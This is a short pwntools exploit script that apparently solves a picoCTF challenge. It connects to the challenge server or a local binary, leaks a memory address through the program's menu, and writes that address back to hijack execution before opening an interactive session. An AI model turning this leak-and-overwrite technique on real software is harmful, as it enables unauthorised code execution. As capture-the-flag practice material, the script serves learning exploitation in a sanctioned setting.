from pwn import *

e = ELF("./vuln")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 61817)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter("===", "S")
p.recvuntil("0x")

leak = int(p.recvline(), 16)
print(hex(leak))

p.sendlineafter("===", "I")
p.sendlineafter("?", "Y")

debug()
p.sendlineafter("===", "l")
p.sendlineafter(":", p64(leak))



p.interactive()
